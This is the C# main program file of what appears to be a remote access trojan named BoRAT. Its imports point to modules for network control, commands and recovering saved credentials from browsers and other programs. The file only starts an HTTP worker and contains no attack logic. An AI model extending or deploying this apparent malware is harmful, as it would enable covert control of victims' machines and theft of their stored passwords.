using System;
using BoRAT.Core.Network;
using BoRAT.Core.Recovery.Programs;
using BoRAT.Core.Data;
using BoRAT.Core.Recovery.Browsers;
using System.Threading;
using BoRAT.Core.Commands;

namespace BoRAT
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                Http.Work();
            }
            catch (Exception ex)
            {
                Console.Write(ex.Message);
            }
        }
      
    }
}
